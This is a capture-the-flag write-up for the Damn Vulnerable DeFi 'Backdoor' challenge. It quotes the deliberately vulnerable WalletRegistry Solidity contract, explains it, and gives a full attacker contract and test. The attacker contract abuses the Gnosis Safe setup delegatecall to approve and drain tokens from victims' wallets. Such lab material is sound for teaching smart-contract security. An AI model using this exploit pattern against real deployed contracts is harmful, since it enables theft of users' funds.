#+AUTHOR: Francesco Cannarozzo
* Backdoor
** Statement
   A registry of *Gnosis safe wallets* keeps a list of beneficiaries: upon registration of a
   wallet by these beneficiaries, 10 DVT tokens are awarded.
   attacker must take them all in a single transaction.
** Files
*** WalletRegistry.sol
**** Code
     #+BEGIN_SRC solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    
    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping (address => bool) public beneficiaries;

    // owner => wallet
    mapping (address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress, 
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }

    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }

    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");
        
        // Ensure initial calldata was a call to `GnosisSafe::setup`
        require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");

        // Ensure wallet initialization is the expected
        require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
        require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");       

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);        
    }
}

     #+END_SRC
**** BreakDown
***** State
      the contract keeps a number of fairly self explanatory constants: *MAX_OWNERS*, *MAX_THRESHOLD*, and
      *TOKEN_PAYMENT*. references are kept to *masterCopy*, i.e. the gnosis safe instance, and
      the gnosis factory *walletFactory*. we also maintain a reference to a IERC20 token.
      
      finally, a mapping of addresses onto booleans is kept to keep track of *beneficiaries*,
      while a mapping of owner addresses to wallet addresses is kept as *wallets*.
***** Constructor
      the constructor requires a few addresses to be passed in:
      that of the master copy and of the walletFactory,
      which are both required to be different than the zero address,
      the token address, and a list of addresses belonging to initial beneficiaries,
      which are then added through the corresponding method.
***** addBeneficiary
      only accepting calls from *Owner*, takes in an address and sets the corresponding
      *beneficiaries[address]* to true.
***** _removeBeneficiary
      private method, takes in an address and sets the corresponding
      *beneficiaries[address]* to false.
***** proxyCreated
      Function called at the creation of a *GnosisSafeWallet*.
      takes as argument the *GnosisSafeProxy* /proxy/, an address /singleton/,
      required to be equal to *masterCopy*, some *bytes* /initializer/, required to have
      its first 4 bytes equal to the *Gnosis.setup* method's selector,
      and a mysterious unnamed uint256.

      after performing a number of checks, including that of *msg.sender* to be *walletFactory*,
      and that the walletOwner is indeed one of the beneficiaries,
      issues the wallet that reward.
** Exploit
   We ought to work our way up the call chain here, see if we can execute our own code.
   we see how *ProxyCreated()*  accepts any number of bytes as its *initializer* parameter.
   this method, declared in *IproxyCreationCallback*, will be called on proxy creation:
   we can use *GnosisSafeProxyFactory.createProxyWithCallback()*. This way, we create a *GnosisSafeProxy* pointing to our singleton.
   The function encoded in *initializer* will then be called upon the proxy: in order to respect registry's requirements,
   that has to be *GnosisSafe.setup*. In turn, this will call upon ModuleManager, which in turn calls its superclass function *execute*.

   execute does something very useful to us: it performs a delegatecall, effectively allowing us to call our own function,
   passed to *setup()* in its *data* parameter, and execute them in the proxy's context.
   By approving *attacker* for the wallet's tokens, we can succesfully drain every one of them.

 #+BEGIN_SRC solidity
 pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "contracts/backdoor/WalletRegistry.sol";

contract BackdoorAttacker {
    GnosisSafeProxyFactory factory;
    address masterCopy;
    address registry;


    constructor(
        address _factory, address _masterCopy, address _registry){
            factory = GnosisSafeProxyFactory(_factory);
            masterCopy = _masterCopy;
            registry = _registry;
        }


    function stealin(address recipient, address _token) external{
        IERC20(_token).approve(recipient, 10 ether);
    }

    function attack(address[] calldata victims, address attacker, address token) external payable{

        bytes memory poison = abi.encodeWithSignature("stealin(address,address)", address(this), token );

        for(uint8 i=0 ; i<victims.length ; i++) {

            address[] memory _victims = new address[](1);
            _victims[0] = victims[i];



            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                                                                _victims, 
                                                                1, 
                                                                address(this), 
                                                                poison, 
                                                                address(0), 
                                                                address(0), 
                                                                0, 
                                                                address(0));
            GnosisSafeProxy proxy = factory.createProxyWithCallback(masterCopy, initializer, 0, IProxyCreationCallback(registry));

        IERC20(token).transferFrom(address(proxy), attacker, 10 ether);            

    }


    }
        receive() external payable {}

}
 #+END_SRC

and we can run the exploit just fine.

#+BEGIN_SRC javascript
   it('Exploit', async function () {

        const attackerFactory = await ethers.getContractFactory('BackdoorAttacker', attacker);
        const attackerContract = await attackerFactory.deploy(
            this.walletFactory.address,
            this.masterCopy.address,
            this.walletRegistry.address
        )
        await attackerContract.connect(attacker).attack(users, attacker.address, this.token.address)
    });
#+END_SRC
